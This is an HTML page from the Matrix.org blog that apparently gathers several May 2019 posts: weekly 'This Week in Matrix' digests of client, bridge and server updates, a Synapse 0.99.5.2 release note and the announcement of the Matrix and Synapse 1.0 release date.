<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="twitter:widgets:csp" content="on" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="twitter:site" content="@matrixdotorg" />
    <meta name="twitter:creator" content="@matrixdotorg" />

    <title>Matrix.org - Blog</title>
    <link rel="shortcut icon" href="/assets/favicon.ico" />
    <link rel="icon" type="image/svg+xml" href="/assets/favicon.svg" />
    <link rel="stylesheet" href="/style.css" />

    

<meta name="description" content="The Matrix.org Foundation blod is where the Matrix Foundation and Community
post updates on their activity. Every Friday evening they publish This Week In
Matrix, a digest of the past week activity.
">

</head>

<body>
    
    <header class="site-header">
    <a href="/" class="brand">
        <img src="/images/matrix-logo-white.svg" alt="Matrix logo">
    </a>
    <input id="site-header-dropdown-checkbox" type="checkbox" class="dropdown-checkbox" aria-hidden="true">
    <label for="site-header-dropdown-checkbox" class="dropdown-button">&#xe602;</label>
    <label for="site-header-dropdown-checkbox" class="page-overlay"></label>
    <nav>
        
        
        <a href="&#x2F;about&#x2F;" class="
            ">
            About
        </a>
        
        
        
        <a href="&#x2F;blog&#x2F;" class="
            current">
            Blog
        </a>
        
        
        
        <a href="&#x2F;docs&#x2F;" class="
            ">
            Documentation
        </a>
        
        
        
        
        
        <div class="section-wrap">
            <input id="ecosystem-submenu-checkbox" type="checkbox" class="submenu-checkbox" aria-hidden="true"
                >
            <label for="ecosystem-submenu-checkbox" class="submenu-title">Ecosystem <div class="arrow">
                </div></label>

            <div class="section-submenu-wrap">
                <div class="section-submenu">
                    
                    
                    <a href="&#x2F;ecosystem&#x2F;clients&#x2F;">Clients</a>
                    
                    
                    <a href="&#x2F;ecosystem&#x2F;bridges&#x2F;">Bridges</a>
                    
                    
                    <a href="&#x2F;ecosystem&#x2F;servers&#x2F;">Servers</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;integrations&#x2F;">Integrations</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;sdks&#x2F;">SDKs</a>
                    
                    <a href="&#x2F;ecosystem&#x2F;hosting&#x2F;">Hosting</a>
                    
                </div>
            </div>
        </div>
        
        
        
        <a href="&#x2F;podcasts&#x2F;" class="
            ">
            Podcasts
        </a>
        
        
        
        <a href="https:&#x2F;&#x2F;shop.matrix.org" class="
            ">
            Shop
        </a>
        
        
        
        <a href="&#x2F;try-matrix&#x2F;" class="primary
            ">
            Try Matrix
        </a>
        
        
    </nav>
</header>


    <main>
        <div class="content">
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;31&#x2F;this-week-in-matrix-2019-05-31&#x2F;" title="This Week in Matrix 2019-05-31">This Week in Matrix 2019-05-31</a></h1>
            <span>
                31.05.2019 00:00
                ‚Äî
                <a href="/category/this-week-in-matrix">
                    This Week in Matrix
                </a>
                ‚Äî
                
                <a href="/author/ben-parsons">
                    Ben Parsons
                </a>
                
            </span>
            
        </header>
        <div>
            <h2 id="matrix-live-half-shot-and-sorunome-discuss-the-discord-matrix-bridge">Matrix Live - Half-Shot and Sorunome discuss the Discord-Matrix Bridge üéô</h2>
<iframe src="https://www.youtube.com/embed/uXVci8AkEKE" frameBorder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>
<h2 id="dept-of-spec-scroll">Dept of Spec üìú</h2>
<p><a href="https://github.com/turt2live">TravisR</a>:</p>
<blockquote>
<p>Alongside Synapse‚Äôs 1.0 release, the Matrix Specification is also getting a 1.0 on June 10th. In practice this means a fresh release of the Client-Server, Server-Server, Application Service, and Identity Service specifications. The Push Specification is just so simple it hasn‚Äôt needed an update yet.</p>
<p>Work has been happening to get all the specs in shape for 1.0 - follow along at <a href="https://github.com/matrix-org/matrix-doc/projects/2?fullscreen=true">https://github.com/matrix-org/matrix-doc/projects/2?fullscreen=true</a></p>
</blockquote>
<h2 id="dept-of-servers-europea">Dept of Servers üè¢</h2>
<h3 id="synapse">Synapse</h3>
<blockquote>
<p>Main news in synapse-land this week is that we released Synapse v0.99.5.2, which fixes a big performance regression which was introduced v0.99.5. Folks who are currently on v0.99.5/v0.99.5.1 are advised to upgrade asap.</p>
<p>Otherwise, work has been continuing apace towards a v1.0 release on 10th June.</p>
</blockquote>
<h3 id="construct">Construct</h3>
<p><a href="https://github.com/matrix-construct/construct/">Construct</a> is a homeserver implementation in C++:</p>
<blockquote>
<ul>
<li>Construct has added support for Server Access Control Lists (m.room.server_acl). The exact behavior of the implementation is configurable by the server administrator, and is even more comprehensive than Synapse. In Construct, ACLs can be configured to cover incoming EDUs, outgoing events, and indirectly fetched events.</li>
<li>The GraphicsMagick library has been utilized to implement the media thumbnailing feature called for by the specification. This is an optional dependency written in C and offers a rich API which as been extremely fun to work with. In the future, expect your Construct to be capable of things like annotating images with the Server Command Line which can be used to generate memes in your chatroom or write custom text on top of stickers!</li>
<li>On the backend we have devoted significant effort to getting the most out of dynamic-linking to simplify the architecture of a large and modular free-software project. This effort makes adding features and contributions to Construct extremely straightforward. I will enumerate the basics for those familiar with developing C software: We are now loading all modules at runtime with the flags <code>RTLD_GLOBAL|RTLD_DEEPBIND|RTLD_LAZY</code> and we build with the flag <code>--weak-unresolved-symbols</code>; during execution we hook the error handling in <code>ld.so</code> to throw our own C++ exception directly from the PLT slot of a missing symbol. In summary this allows features to be added to Construct by simply creating an interface in a header and definitions in a loadable module, while still enjoying optional loading and unloading of the module at runtime. This is a significant feat that remains unrealized in most existing projects around the free software ecosystem!</li>
</ul>
</blockquote>
<h2 id="dept-of-sdks-and-frameworks">Dept of SDKs and Frameworks üß∞</h2>
<h2 id="dept-of-clients-iphone">Dept of Clients üì±</h2>
<h3 id="nheko-0-6-4-and-0-7-0-roadmap">nheko 0.6.4 and 0.7.0 roadmap</h3>
<p><a href="https://matrix.to/#/@red_sky:ocean.joedonofry.com">red_sky</a> updated us on <a href="https://github.com/Nheko-Reborn/nheko/">nheko</a>:</p>
<blockquote>
<p>Just wanted to pop in and mention that 0.6.4 is out this week.  It comes with a decent number of bug fixes.</p>
</blockquote>
<p>And then:</p>
<blockquote>
<p>Nheko 0.7.0 roadmap is out:
<a href="https://github.com/Nheko-Reborn/nheko/milestone/2">https://github.com/Nheko-Reborn/nheko/milestone/2</a><br />
Also, Nheko-Reborn has a new team member, with MonokelPinguin joining the team : <a href="https://github.com/MonokelPinguin">https://github.com/MonokelPinguin</a>. (goes by Nico in the <a href="https://matrix.to/#/#nheko-reborn:matrix.org">#nheko-reborn</a> room)</p>
</blockquote>
<p><a href="https://matrix.to/#/@l0phty1:privacytools.io">el0</a> pointed out that nheko is available on flathub: <a href="https://flathub.org/apps/details/io.github.NhekoReborn.Nheko">https://flathub.org/apps/details/io.github.NhekoReborn.Nheko</a></p>
<h3 id="continuum-javafx-client">continuum, JavaFX client</h3>
<p><a href="https://matrix.to/#/@uforia:matrix.org">yuforia</a>:</p>
<p><a href="https://github.com/koma-im/continuum-desktop">continuum</a> modified the JSON parser to save a copy of the source. Now fields that are not standard or not yet supported are displayed when you right-click to view the source. For example, &quot;age&quot; and &quot;transaction_id&quot; are not used by the app, but are available when viewing the raw JSON</p>
<p><img src="/blog/img/2019-05-31-continuum.png" alt="continuum screenshot" /></p>
<h3 id="neo">Neo</h3>
<p><a href="https://matrix.to/#/@f0x:pixie.town">f0x</a> has been working on Neo:</p>
<blockquote>
<p>Neo can now finally fetch old backlog, with a fancy css loading animation</p>
<p>The Neo room has moved to <a href="https://matrix.to/#/#neo:pixie.town">#neo:pixie.town</a>, and the site+deployment are being moved to <a href="https://neo.pixie.town">https://neo.pixie.town</a></p>
</blockquote>
<h3 id="fractal">Fractal ü¶∂</h3>
<p><a href="https://matrix.to/#/@afranke:matrix.org">Alexandre Franke</a>:</p>
<blockquote>
<p><a href="https://wiki.gnome.org/Apps/Fractal">Fractal</a> got initial support for being kicked, implemented by first time contributor Isaac Curtis.</p>
<p>We also joined the new call at <a href="https://stopthemingmy.app">https://stopthemingmy.app</a></p>
</blockquote>
<h3 id="riot-web">Riot Web</h3>
<blockquote>
<p>Continued work on edits and reactions. Also ongoing work on sdk-level support for cross-signing. Released Riot 1.2.0 (and 1.2.1).</p>
</blockquote>
<h2 id="dept-of-bridges-bridge-at-night">Dept of Bridges üåâ</h2>
<h3 id="mautrix-telegram-mautrix-facebook-mautrix-hangouts-mautrix-whatsapp">mautrix-telegram, mautrix-facebook, mautrix-hangouts, mautrix-whatsapp</h3>
<p>Can you believe it, <a href="https://matrix.to/#/@tulir:maunium.net">tulir</a> had a busy week working on his various bridges:</p>
<blockquote>
<p><a href="https://github.com/tulir/mautrix-telegram">mautrix-telegram</a> now has native Matrix edit support in both directions and basic Prometheus metrics. I'll probably start making 0.6.0 RCs after improving the metrics a bit.</p>
<p><a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a> and <a href="https://github.com/tulir/mautrix-hangouts">mautrix-hangouts</a> got some bugfixes and options to configure the displaynames of the ghost users on Matrix (like adding <code>(FB)</code> or <code>(Hangouts)</code> suffixes).</p>
<p><a href="https://github.com/tulir/mautrix-whatsapp">mautrix-whatsapp</a>'s Matrix puppeting was finished (meaning typing notifs, read receipts and presence updates can now be bridged to WhatsApp) and unexpected disconnection handling was fixed (automatic reconnections should now usually work again).
Backfilling needed some hacks to work with Matrix puppeting. The problem is that the real Matrix users have rate limits and can't send timestamp-massaged messages. I decided to just invite the default ghost user to the room while backfilling and make it leave afterwards so that private chat room names and such would stay intact. Some clients like Riot Android/iOS sometimes do weird things, such as moving the room out of &quot;People&quot;, but that shouldn't be too bad.</p>
</blockquote>
<h2 id="dept-of-ops">Dept of Ops üõ†</h2>
<h3 id="matrix-docker-ansible-deploy-makes-synapse-optional">matrix-docker-ansible-deploy makes Synapse optional</h3>
<p><a href="https://matrix.to/#/@slavi:devture.com">Slavi</a>:</p>
<blockquote>
<p><a href="https://github.com/spantaleev/matrix-docker-ansible-deploy">matrix-docker-ansible-deploy</a> has seen some work in becoming more flexible.</p>
<p>Synapse is not a requirement anymore. People can now use the playbook to install any of the other services, wiring them to a Synapse instance installed in another way.
This is mostly useful for installing bridges or other auxiliary services without going &quot;all in&quot; on the playbook.
Not having Synapse as a fixed requirement also opens the door for installing alternative homeservers, when such become available in the future.</p>
<p>On a similar note, to ease maintanability, all bridges have been moved to separate Ansible roles (outside of the <code>matrix-synapse</code> role).
There have been lots of improvements related to bridge configuration with even more likely to come soon.</p>
</blockquote>
<h3 id="0-99-5-2-kubernetes-optimized-images">0.99.5.2 kubernetes-optimized images</h3>
<p><a href="https://github.com/ananace/">Ananace</a> had <a href="https://github.com/ananace/matrix-synapse">0.99.5.2 kubernetes-optimized images</a> ready to go very quickly.</p>
<h2 id="dept-of-services-rocket">Dept of Services üöÄ</h2>
<h3 id="matrix-user-documentation-launches-tada">Matrix User Documentation launches üéâ</h3>
<p><a href="https://matrix.to/#/@aaron:raim.ist">Aaron</a> (formerly known as Aaron Raimist) has been a major help to the Matrix project, and has recently launched something new:</p>
<blockquote>
<p>I have started another Matrix documentation project, Matrix User Documentation. I know, there are several however none of them aim to actually be a handbook for using Riot or any other clients. I would like for this to become a place where you can find &quot;The (unofficial) Riot Handbook&quot; or &quot;The (unofficial) Quaternion Handbook&quot; as well as a place where you can find answers to more of your FAQs.</p>
<p>It's still very early, only a few answers are written so far and none of the handbooks have been started but I would welcome any community assistance. You can view what I have so far at: <a href="http://mud.raim.ist/en/latest/">http://mud.raim.ist/en/latest/</a></p>
<p>You can contribute some documentation at: <a href="https://github.com/aaronraimist/matrix-user-documentation">https://github.com/aaronraimist/matrix-user-documentation</a> and join our room: <a href="https://matrix.to/#/#matrix-user-documentation:raim.ist">#matrix-user-documentation:raim.ist</a></p>
</blockquote>
<h3 id="matrixservers-net">matrixservers.net</h3>
<p>We welcomed <a href="https://matrix.to/#/@atreatis:novaim.com">Atreatis</a> to Matrix recently. They are creating a new directory service:</p>
<blockquote>
<p>Someone mentioned earlier that there is a need for a list of public servers on Github so people can find and add their public matrix servers. Which combines well with what I am building at the moment. Hopefully you guys don't mind helping me out on creating the list and spreading the word. The repository can be found here: <a href="https://github.com/Atreatis/matrix-servers">https://github.com/Atreatis/matrix-servers</a></p>
</blockquote>
<h2 id="final-thoughts-thought-balloon">Final thoughts üí≠</h2>
<p><a href="https://gitlab.com/darnir/matrix-shell-suite">Matrix Shell Suite</a> is a promising looking project which could deserve more attention.</p>
<p>Thank You to <a href="https://pyconweb.com/">PyConWeb</a> and especially to <a href="https://matrix.to/#/@hardy:netspectrum.de">Hardy</a> for letting richvdh and myself host TWO Matrix sessions at your event last weekend - was a great time and I hope everyone enjoyed the presentations and workshops.</p>
<h2 id="that-s-all-i-know-checkered-flag">That's all I know üèÅ</h2>
<p>See you next week, and be sure to stop by <a href="https://matrix.to/#/#twim:matrix.org">#twim:matrix.org</a> with your updates!</p>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;30&#x2F;synapse-0-99-5-2-released&#x2F;" title="Synapse 0.99.5.2 released">Synapse 0.99.5.2 released</a></h1>
            <span>
                30.05.2019 00:00
                ‚Äî
                <a href="/category/releases">
                    Releases
                </a>
                ‚Äî
                
                <a href="/author/neil-johnson">
                    Neil Johnson
                </a>
                
            </span>
            
        </header>
        <div>
            <p>0.99.5.2 contains a critical performance fix following a regression that was introduced in 0.99.5. Affected servers will have experienced increased CPU and RAM usage with a knock on effect of generally sluggish performance.</p>
<p>Separately, we are also looking into reports relating to further performance degradations that may have been introduced as part of 0.99.5, though consider the 0.99.5.2 fix to be a significant improvement on previous 0.99.5.x releases.</p>
<p>Please upgrade asap.</p>
<p>You can get the new update¬†<a href="https://github.com/matrix-org/synapse/releases/tag/v0.99.5.2">here</a>¬†or any of the sources mentioned at¬†<a href="https://github.com/matrix-org/synapse">https://github.com/matrix-org/synapse</a>. Note, Synapse is now available from PyPI, pick it up¬†<a href="https://pypi.org/project/matrix-synapse/">here</a>. Also, check out our <a href="https://matrix.org/docs/guides/installing-synapse">Synapse installation guide page</a>.</p>
<h1 id="synapse-v0-99-5-2-changelog">Synapse v0.99.5.2 Changelog</h1>
<h2 id="bugfixes">Bugfixes</h2>
<ul>
<li>Fix bug where we leaked extremities when we soft failed events, leading to performance degradation. (<a href="https://github.com/matrix-org/synapse/issues/5274">#5274</a>, <a href="https://github.com/matrix-org/synapse/issues/5278">#5278</a>, <a href="https://github.com/matrix-org/synapse/issues/5291">#5291</a>)</li>
</ul>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;24&#x2F;final-countdown-to-1-0&#x2F;" title="Final countdown to 1.0">Final countdown to 1.0</a></h1>
            <span>
                24.05.2019 00:00
                ‚Äî
                <a href="/category/general">
                    General
                </a>
                ‚Äî
                
                <a href="/author/matthew-hodgson">
                    Matthew Hodgson
                </a>
                
            </span>
            
        </header>
        <div>
            <p>Hi all,</p>
<p>After lots of refinements, polishing and a few distractions we‚Äôre finally at the point of announcing the final timeline for both Matrix 1.0 and Synapse 1.0! We are targeting <strong>Monday 10th June</strong> as our release date - please consider this your two week warning!</p>
<p>This is the end game of the process we began back in February when we released the <a href="https://matrix.org/blog/2019/02/04/matrix-at-fosdem-2019">first stable release of the Server-Server API</a> at FOSDEM, and started the <a href="https://matrix.org/blog/2019/02/05/synapse-0-99-0">Synapse 0.99</a> release series to prepare for 1.0.</p>
<p>Matrix 1.0 refers to the upcoming set of API releases which provides a matched set of stable and secure APIs across all of Matrix - at which point the project (at last) exits beta! In practice, this will be Client-Server API 0.5 (including final membership lazy loading, E2E backups and interactive verification and lots more), SS API 0.2 (including server key validity period fixes and associated v5 room protocol) and any other spec updates. The next 2 weeks will see a flurry of spec activity as we get everything together - you can see the full list and track the progress for the CS 0.5 spec release at https://github.com/matrix-org/matrix-doc/projects/2.</p>
<p>Meanwhile, Synapse 1.0 will be the reference implementation of Matrix 1.0, and so makes the changes required to implement Matrix 1.0 and close all currently known security and stability issues and thus exit beta. This means changing the default room protocol version used for new rooms to be <a href="https://github.com/matrix-org/matrix-doc/blob/37871106c6fc6013c17b5711fb93853fff140267/proposals/2002-rooms-v4.md">v4</a>, which includes the new <a href="https://github.com/matrix-org/matrix-doc/blob/f714aaadd011ac736d779f8460202a8d95799123/proposals/1442-state-resolution.md">state resolution algorithm</a>, as well as <a href="https://github.com/matrix-org/matrix-doc/blob/erikj/event_id_hashes/proposals/1659-event-id-as-hashes.md">collision-resistant event IDs</a>, which are now formatted to be <a href="https://github.com/matrix-org/matrix-doc/blob/rav/proposal/no_slash_in_event_id/proposals/1884-replace-slashes-in-event_ids.md">URL safe</a>. <strong>Support for v4 rooms shipped in <a href="https://matrix.org/blog/2019/05/21/synapse-0-99-5-1-released">Synapse 0.99.5.1</a>, so please upgrade asap to 0.99.5.1 before 1.0 is released to ease the transition.</strong>. Synapse 1.0 will also ship with support for the upcoming v5 room protocol (which enforces honouring server key validity periods), but this will not used as the default for new rooms until sufficient servers are speaking Matrix 1.0.</p>
<p>As part of the security work, Matrix 1.0 and Synapse 1.0 also contains a <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md#it-used-to-work-just-fine-why-are-you-breaking-everything">breaking change</a> that requires a valid TLS certificate on the federation API endpoint. <strong>Servers that do not configure their certificate will no longer be able to federate post 1.0</strong></p>
<p>You can check that your server has been correctly configured <a href="https://federationtester.matrix.org/">here</a> and see <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md">here</a> for more info on what you need to do. If in doubt head to <a href="https://matrix.to/#/#synapse:matrix.org">#synapse:matrix.org</a>.</p>
<p>We've been tracking readiness for the certificate change at https://arewereadyyet.com, at the time of writing 68% of active <em>servers</em> on the federation have valid certificates. We obviously would want that number to be higher, however since the largest installations <em>have</em> upgraded the total number of <em>users</em> who are ready for 1.0 stands at 96%, which we consider to be high enough to release 1.0.</p>
<p><img src="/blog/img/awry.2019-05-24.png" alt="" /></p>
<p><strong>This is not a drill</strong>, from here until 10th June we need everyone to not only ensure that their own server is ready, but also to encourage their fellow admins to update as well. With your help we can get everyone over the line!</p>
<p>Thanks everyone for your help to date, especially those providing support in <a href="https://matrix.to/#/#synapse:matrix.org">#synapse:matrix.org</a>.</p>
<p>Onwards!</p>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;24&#x2F;this-week-in-matrix-2019-05-24&#x2F;" title="This Week in Matrix 2019-05-24">This Week in Matrix 2019-05-24</a></h1>
            <span>
                24.05.2019 00:00
                ‚Äî
                <a href="/category/this-week-in-matrix">
                    This Week in Matrix
                </a>
                ‚Äî
                
                <a href="/author/ben-parsons">
                    Ben Parsons
                </a>
                
            </span>
            
        </header>
        <div>
            <h2 id="matrix-live-wilko-creator-of-pattle">Matrix Live - Wilko, creator of Pattle üéô</h2>
<p>This week I chatted to <a href="https://matrix.to/#/@wilko:matrix.org">Wilko</a>, creator of Pattle.</p>
<iframe src="https://www.youtube.com/embed/GqmX9FyxkCc" frameBorder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>
<h2 id="dept-of-servers-europea">Dept of Servers üè¢</h2>
<h3 id="synapse">Synapse</h3>
<p>Neil:</p>
<blockquote>
<p>Folks, big news this week as we announce that Synapse v1.0 is scheduled for release on 10th June - <a href="https://matrix.org/blog/2019/05/24/final-countdown-to-1-0">read all about it here</a></p>
<p>Aside from that we shipped <a href="https://matrix.org/blog/2019/05/21/synapse-0-99-5-1-released">v0.99.5.1</a> which (hopefully) is the penultimate release ahead of v1.0. Please, everyone upgrade to v0.99.5.1 because it implements rooms v4 which will be the default room version in Synapse v1.0.</p>
<p>0.99.5.1 also contains experimental support for edits and reactions which are currently hidden behind a Riot labs flag.</p>
</blockquote>
<h3 id="dendrite">Dendrite</h3>
<p>Brendan:</p>
<blockquote>
<p>Some activity has been happening this week in Dendrite-land, with <a href="https://matrix.to/#/@brendan:abolivier.bzh">Brendan</a> adding support for Go modules to the project, and <a href="https://matrix.to/#/@andrewm:amorgan.xyz">anoa</a> adding SyTest runs to the project‚Äôs CI. These were two long-awaited maintenance works that will make working on Dendrite much easier in the future!</p>
</blockquote>
<h2 id="dept-of-sdks-and-frameworks">Dept of SDKs and Frameworks üß∞</h2>
<blockquote>
<p>libQMatrixClient (that will soon become libQuotient) 0.5.2 has been released, with the sole purpose of fixing a nasty bug unmarking some direct chats when doing initial sync or a clean-cache start up. Everybody on 0.5.x branch is advised to upgrade.</p>
</blockquote>
<h2 id="dept-of-clients-iphone">Dept of Clients üì±</h2>
<h3 id="qmatrixclient-to-quotient">QMatrixClient to Quotient</h3>
<p><a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a>:</p>
<blockquote>
<p>The process of renaming QMatrixClient to Quotient has commenced - expect some turbulence while we're transitioning. The place for the repos is at <a href="https://github.com/quotient-im">https://github.com/quotient-im</a>. Note that although the library repo name has changed, the old version of the library will continue releases under the old name (libQMatrixClient), and only in the master branch the library will be renamed. In most cases redirects should bring you home even if you request the old URL (thanks to GitHub); however, people with git repos are strongly advised to update their remotes to new URLs!</p>
</blockquote>
<p>In other news:</p>
<blockquote>
<p>For platforms that don't have a separate libQMatrixClient package (that is, Windows, macOS, Flatpak and AppImage), Quaternion 0.0.9.4 has been rebuilt with libQMatrixClient 0.5.2 - in the form of Quaternion 0.0.9.4c release.</p>
</blockquote>
<h3 id="tangent">tangent</h3>
<p><a href="https://gitlab.com/sanlox/tangent">tangent</a> is an embeddable HTML client from <a href="https://matrix.to/#/@sanlox:matrix.org">sanlox</a>:</p>
<blockquote>
<p>I added guest login, possibility to disable guest login, possibility to set own message limit on startup and various error messages. Cleaned up the code to make it more consistent and faster. Everything I wanted to have for this tiny embeddable web chat is now there so I'd consider it finished for now.</p>
</blockquote>
<p>Check it out at: <a href="https://sanlox.dev/tangent/">https://sanlox.dev/tangent/</a></p>
<p><img src="/blog/img/2019-05-24-tangent.png" alt="" /></p>
<h3 id="continuum">continuum</h3>
<p><a href="https://matrix.to/#/@uforia:matrix.org">yuforia</a> updated their JavaJX client:</p>
<blockquote>
<p>minor changes in <a href="https://github.com/koma-im/continuum-desktop">continuum</a> this week:</p>
<ul>
<li>updated controlsfx to version 11, which has better modularization support</li>
<li>sync issue indicator now uses NotificationPane from controlsfx, so now it has slide-in animation when it appears
https://matrix.org/_matrix/media/v1/download/matrix.org/VtPORWFqBamfnuJtPtgEXWBs</li>
</ul>
</blockquote>
<p><img src="/blog/img/2019-05-24-continuum.png" alt="" /></p>
<h3 id="neo-now-has-image-video-and-general-file-sending">Neo now has image, video and general file sending</h3>
<p><a href="https://matrix.to/#/@f0x:lain.haus">Fox</a>:</p>
<blockquote>
<p>Neo now supports sending multiple images, videos and files at once. You'll get a bar with previews, and the option to remove them from the queue/add more.<br />
There's also been a bunch of changes to how events are handled. Images and videos should be much more robust against missing keys (no thumbnail, no information, etc), and there's basic displaying of the most common state events.<br />
I also added an experimental media repository fallback option, which is disabled by default, and only implemented for room avatars. This allows you to provide a list of alternative homeservers Neo is allowed to try when your own homeserver can't load a piece of media.<br />
Due to the loss of lain.haus, I lost admin access in the Neo room, so keep your eyes out for a new one when my infra is back.<br />
I'm currently not really versioning anything, but I do push significant commits to <a href="https://neo.lain.haus/neo">https://neo.lain.haus/neo</a> for people to try. Once it gets to a more useable state, I'll start adopting semantic versioning.</p>
</blockquote>
<p><img src="/blog/img/2019-05-24-neo.png" alt="" /></p>
<h3 id="spectral-update">Spectral update</h3>
<p><a href="https://matrix.to/#/@bhat:encom.eu.org">Black Hat</a>:</p>
<blockquote>
<p>You can now paste images from the clipboard in <a href="https://gitlab.com/spectral-im/spectral">Spectral</a>. It is also possible to change room name and topic in room settings. A new release is pushed to Flathub to address direct room issues. Also there've been discussions about implementing custom room themes and backgrounds.</p>
</blockquote>
<h3 id="riot-web">Riot Web</h3>
<blockquote>
<ul>
<li>Continued work on reactions and edits</li>
<li>New emoji font added to standardise emoji appearance and assist OS / browser combinations that don‚Äôt support emoji by default</li>
</ul>
</blockquote>
<h3 id="riot-mobile">Riot Mobile</h3>
<blockquote>
<ul>
<li>Continued work on reactions and edits</li>
<li>Riot-iOS has a new actions menu on event</li>
<li>Fix registration with an email</li>
</ul>
</blockquote>
<h3 id="riot-and-riotx-available-from-f-droid">Riot and RiotX available from F-Droid</h3>
<p><a href="https://matrix.to/#/@krombel:msg-net.de">krombel</a> updated their Riot(X) F-Droid repos:</p>
<blockquote>
<p>I finally found some time to update my fdroid repos which provide the development builds of riot and riotx. Now the builds of buildkite are part of the repos.<br />
There are now 4 separate repos: One for each app and flavor. You can have a look at https://fdroid.krombel.de to find out the URL for the version you want to use.</p>
</blockquote>
<pre style="background-color:#1e1e1e;color:#dcdcdc;"><code><span>Riot-dev (F-Droid; Repo; Build-Source)
</span><span>    https://fdroid.krombel.de/riot-dev-fdroid
</span><span>    https://fdroid.krombel.de/riot-dev-fdroid/fdroid/repo
</span><span>    Fingerprint: 312E07B9444D0D1B615EBBAAC55EA4E5A54E123C3BEFCCA5D18B5E12DFC95BDC
</span><span>
</span><span>Riot-dev (GPlay; Repo; Build-Source)
</span><span>    https://fdroid.krombel.de/riot-dev-gplay
</span><span>    https://fdroid.krombel.de/riot-dev-gplay/fdroid/repo
</span><span>    Fingerprint: 81EDF1741A51B944B00B55E307C7AA043623CB646599182A104B895B6B319844
</span><span>
</span><span>RiotX-dev (F-Droid; Repo; Build-Source)
</span><span>    https://fdroid.krombel.de/riotx-dev-fdroid
</span><span>    https://fdroid.krombel.de/riotx-dev-fdroid/fdroid/repo
</span><span>    Fingerprint: FD146EF30FA9F8F075BDCD9F02F069D22061B1DF7CC90E90821750A7184BF53D
</span><span>RiotX-dev (GPlay; Repo; Build-Source)
</span><span>
</span><span>    https://fdroid.krombel.de/riotx-dev-gplay
</span><span>    https://fdroid.krombel.de/riotx-dev-gplay/fdroid/repo
</span><span>    Fingerprint: 5564AB4D4BF9461AF7955449246F12D7E792A8D65165EBB2C0E90E65E77D5095
</span></code></pre>
<h2 id="dept-of-bridges-bridge-at-night">Dept of Bridges üåâ</h2>
<h3 id="major-whatsapp-bridging-update">Major WhatsApp bridging update</h3>
<p><a href="https://matrix.to/#/@tulir:maunium.net">tulir</a> made great strides on <a href="https://github.com/tulir/mautrix-whatsapp">mautrix-whatsapp</a> this week:</p>
<blockquote>
<p>I've been working on mautrix-whatsapp to add history bridging and Matrix puppeting.</p>
<ul>
<li>New portals are populated with some history when creating them (exact count is configurable)</li>
<li>All messages missed during bridge downtime are backfilled</li>
<li>Creating portals is smarter now:</li>
<li>When logging in initially, it'll create portals for a few recent chats (count configurable).</li>
<li>It'll create portals when there are incoming messages as before, but it should no longer create portals for chats that only have old messages.</li>
<li>The missed message backfilling creates portals when necessary.</li>
</ul>
<p>Matrix puppeting isn't quite finished yet. It can already use your Matrix account to bridge messages sent from whatsapp mobile, but it doesn't use the account to bridge EDUs (typing notifs, presence, read receipts) yet.</p>
<p>To make the history bridging a bit nicer, I made a PR to fix timestamp massaging in synapse: https://github.com/matrix-org/synapse/pull/5233. Timestamp massaging was removed from the spec in 1.0, but it wasn't intentionally removed from synapse, it just broke due to other changes. It was probably supposed to stay there as an easter egg until there's a proper solution for bridging history.</p>
</blockquote>
<h2 id="dept-of-ops">Dept of Ops üõ†</h2>
<p><a href="https://github.com/ananace/">Ananace</a> pushed updated <a href="https://github.com/ananace/matrix-synapse">K8s images for Synapse 0.99.5</a></p>
<p><a href="https://matrix.to/#/@bubu:bubu1.eu">Bubu</a> updated synapse on Arch:</p>
<blockquote>
<p>Archlinux updated to synapse 0.99.5 as well after the requests, urllib3 <a href="https://github.com/matrix-org/synapse/commit/62388a1e44278f9aa22244750433ac46142b266a">incomopatibility</a> thing was sorted out.</p>
</blockquote>
<p><a href="https://matrix.to/#/@mathijs:matrix.vgorcum.com">Mathijs</a> updated the synapse avhost docker image:</p>
<blockquote>
<p>With synapse v 0.99.5.1 the <a href="https://hub.docker.com/r/avhost/docker-matrix/tags">avhost docker image</a> has finally moved to python 3</p>
</blockquote>
<h2 id="dept-of-services-rocket">Dept of Services üöÄ</h2>
<h3 id="modular">Modular</h3>
<p>New widget for Scalar: EtherCalc. </p>
<p><img src="/blog/img/2019-05-24-ethercalc.png" alt="" /></p>
<h2 id="dept-of-bots-robot-face">Dept of Bots ü§ñ</h2>
<h3 id="quatbot">QuatBot</h3>
<p>Very <em>very</em> new, let's take a look at QuatBot, which uses libQuotient:</p>
<blockquote>
<p><a href="https://github.com/adriaandegroot/QuatBot">QuatBot</a> is a simple meeting-management bot for use with the Matrix. Taking turns during an online meeting -- and making sure everyone gets to have their say -- takes a bit of organizing, and this bot helps you do that. QuatBot runs as a command-line application.</p>
</blockquote>
<h2 id="dept-of-articles-memo">Dept of Articles üìù</h2>
<p><a href="https://matrix.to/#/@uhoreg:matrix.org">uhoreg</a> wrote a <em>really</em> informative article about key verification:</p>
<blockquote>
<p>For those who want to know more about the security behind emoji-based key verification, I've written a blog post about it: https://www.uhoreg.ca/blog/20190514-1146</p>
</blockquote>
<h2 id="dept-of-gsoc-mortar-board">Dept of GSOC üéì</h2>
<h3 id="gsoc-2019-reliable-bridges">GSoC 2019 ‚Äì Reliable Bridges</h3>
